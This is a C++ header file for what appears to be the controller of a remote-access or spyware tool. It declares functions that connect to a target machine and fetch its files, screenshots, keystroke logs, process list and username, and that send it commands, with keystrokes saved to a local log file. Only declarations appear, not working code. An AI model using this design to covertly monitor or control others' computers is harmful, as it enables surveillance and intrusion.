/*
author: Forec
last edit date: 2016/09/16
email: forec@bupt.edu.cn
LICENSE
Copyright (c) 2015-2017, Forec <forec@bupt.edu.cn>

Permission to use, copy, modify, and/or distribute this code for any
purpose with or without fee is hereby granted, provided that the above
copyright notice and this permission notice appear in all copies.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/

#ifndef CONNECT_H
#define CONNECT_H

#include <WINSOCK2.H>
#include <STDIO.H>
#include <string.h>
#include <time.h>

#define BUFLEN 20000
#define IPLEN 20

#define HISTORY "_history.txt"
#define _CRT_SECURE_NO_WARNINGS

#pragma  comment(lib,"ws2_32.lib")

struct target {
    char name[BUFLEN];
    char ip[IPLEN];
    bool isconnected;
};

extern char temp[BUFLEN+4];
bool Tryconnect(SOCKET &, const target &);
void getFilename(char *);
bool getFile(SOCKET &,const QString &);
bool getScreenShot(SOCKET &, const target &);
bool getKeyBoard(SOCKET &, char *);
bool getPSList(SOCKET &, char *);
bool getUserName(SOCKET &, char *);
bool sendCMD(SOCKET &, const QString &, char *);
bool checkL(SOCKET &);

int send_s(SOCKET &sock, const char *buf, INT32 sendlen);
int recv_s(SOCKET &sock, char *buf, unsigned int buflen);

extern int sendLen;
extern FILE *tempfp;

const char keyboard_save_file[] = "E:\\key.log";

#endif // CONNECT_H
